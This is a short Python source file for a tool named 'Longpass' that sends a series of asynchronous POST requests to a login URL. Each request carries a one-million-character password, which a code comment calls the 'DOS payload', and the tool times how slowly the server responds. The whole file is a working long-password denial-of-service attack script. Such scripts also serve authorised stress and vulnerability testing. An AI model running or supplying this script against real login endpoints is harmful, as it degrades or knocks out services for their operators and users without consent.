import sys
import asyncio
import aiohttp
import time

class Longpass:

    url = ""
    delay = 1
    username = ""
    size = 1000000
    repeats = 20
    password = ""

    iterations = 0
    tasks = list()
    payload = dict()

    ui = list()

    def run(self):


        self.updateUI(2, "Generating password...")
        password = self.generatePassword(self.size)
        self.updateUI(2, "Done!")

        # Set the POST payload
        # @todo Add POST variables from the command line argument, ie. --variables username=john,email=user@domain.com
        # @todo Add an ability to set a custom variable name for the "password" DOS payload variable
        self.payload = { 'username': self.username, 'password': password }


        # Add requests to the task list
        for i in range(self.repeats):
            delay = i * self.delay
            self.updateUI((i+4), "Request " + str(i+1) + ": Scheduled...")
            self.tasks.append(self.makeRequest(delay, i))

        # Event loop that waits for tasks to complete
        loop = asyncio.get_event_loop()

        # Run the loop until every task is complete
        loop.run_until_complete(asyncio.wait(self.tasks))
        #loop.run_until_complete(self.shootTasks())


        # Close the loop
        loop.close()


    def shootTasks(self):
        for i in range(self.repeats):
            self.makeRequest()
            time.sleep(self.delay)

    def generatePassword(self, size):
        # Generate password
        # @todo Generate the password from random characters
        return "x" * size

    def clear(self):
        """Clear screen, return cursor to top left"""
        sys.stdout.write('\033[2J')
        sys.stdout.write('\033[H')
        sys.stdout.flush()

    def updateUI(self, position, txt):
        # EAFP
        try:
            self.ui[position] = txt
        except IndexError:
            self.ui.insert(position, txt)

        #progress = str(round((self.iterations / (self.repeats * 2)) * 100, 2)) + "% done"
        progress = "Mister"

        '''
        try:
            self.ui[16] = progress
        except IndexError:
            self.ui.insert(16, progress)
        '''
        self.clear()
        for msg in self.ui:
            sys.stdout.write(msg + "\n")
        #sys.stdout.write("" + str(round((self.iterations / (self.repeats * 2)) * 100, 2)) + "% done - server response time " + str(round(duration, 2)) + " seconds.\n")
        #sys.stdout.write("Server response time " + str(round(duration, 2)) + " seconds.")

    def progress(self,step):
        self.iterations += step
        progress = "\n" + str(round((self.iterations / (self.repeats * 2)) * 100, 2)) + "% done"
        self.updateUI(self.repeats + 3, progress)

    async def makeRequest(self, delay, i):
        """
        Make an asynchronous POST request
        """


        position = 3 + i

        #self.updateUI(position, "Request " + str(i+1) + " waiting...")

        # Queue up
        await asyncio.sleep(delay)

        id = "Request " + str(i+1)

        self.updateUI(position, id + ": Sending request...")

        # Add to iteration counter
        self.progress(1)

        #self.printStatus(0)

        # Measure time
        start = time.time()

        # The actual request
        response = await aiohttp.post(self.url, data = self.payload)

        # Add to iteration counter
        self.progress(1)

        # Request response time
        duration = time.time() - start

        # Display the progress
        #self.printStatus(duration)

        #self.updateUI(3, str(round((self.iterations / (self.repeats * 2)) * 100, 2)) + "% done - server response time " + str(round(duration, 2)) + " seconds.\n")
        self.updateUI(position, id + ": Done, server response time " + str(round(duration, 2)) + " seconds.")

        # Close the connection
        response.close()

        # Wait for a given time
        #time.sleep(self.delay)
